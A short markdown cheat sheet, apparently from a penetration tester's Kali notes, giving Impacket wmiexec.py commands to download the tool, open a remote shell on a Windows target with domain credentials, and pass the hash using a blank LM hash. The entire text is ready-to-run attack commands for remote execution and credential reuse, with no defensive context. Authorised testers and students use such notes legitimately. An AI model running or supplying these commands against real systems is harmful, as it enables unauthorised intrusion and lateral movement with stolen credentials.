```python - kali
python3 /usr/share/doc/python3-impacket/examples/wmiexec.py $DOMAIN/$USER:$PASSWORD@$TARGET
```

or

```wget - kali
https://raw.githubusercontent.com/SecureAuthCorp/impacket/master/examples/wmiexec.py
```

#### Shell with wmi.py
```python - kali
wmiexec.py $DOMAIN/$USER:$PASSWORD@$TARGET
```

#### Passing the hash (blank LM hash)
```python - kali
wmiexec.py $DOMAIN/$USER@$TARGET -hashes aad3b435b51404eeaad3b435b51404ee:$HASH
```

